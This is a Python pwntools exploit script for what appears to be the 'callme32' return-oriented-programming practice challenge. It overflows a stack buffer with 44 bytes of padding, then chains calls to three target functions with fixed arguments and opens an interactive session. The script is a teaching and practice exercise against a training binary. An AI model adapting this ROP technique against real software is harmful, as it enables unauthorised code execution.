#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('callme32')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *pwnme+97
continue
'''.format(**locals())

pop_esi_edi_ebp = 0x080487f9

rop = ROP(exe)
params = [0xdeadbeef, 0xcafebabe, 0xd00df00d]
rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)
print(rop.dump())
pay = b'A' * 44
pay += rop.chain()

# pay += flat(
#     exe.sym.callme_one,
#     pop_esi_edi_ebp,
#     0xdeadbeef,
#     0xcafebabe,
#     0xd00df00d,
#     exe.sym.callme_two,
#     pop_esi_edi_ebp,
#     0xdeadbeef,
#     0xcafebabe,
#     0xd00df00d,
#     exe.sym.callme_three,
#     pop_esi_edi_ebp,
#     0xdeadbeef,
#     0xcafebabe,
#     0xd00df00d,
# )

io = start()
io.clean()
io.sendline(pay)
io.interactive()

